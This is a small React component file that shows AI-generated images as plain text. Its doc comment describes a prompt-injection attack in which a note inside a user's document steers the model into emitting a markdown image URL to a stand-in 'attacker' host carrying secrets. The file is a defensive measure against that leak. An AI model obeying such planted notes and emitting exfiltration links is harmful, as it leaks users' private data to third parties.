import type { ComponentProps } from "react";

/**
 * Stands in for an image the model composed. A reply is built from the
 * document the user sent, so a note can steer the model into ending with
 * `![](https://attacker/c?d=<the note's secrets>)`, and an `<img>` here would
 * fetch that URL the moment the reply renders. The alt text and the URL are
 * shown as text instead; nothing is loaded.
 */
export function AIImagePlaceholder({ alt, src }: ComponentProps<"img">) {
  const label = alt?.trim() || src || "";
  return (
    <span className="ai-msg-image" title={src}>
      {label}
    </span>
  );
}
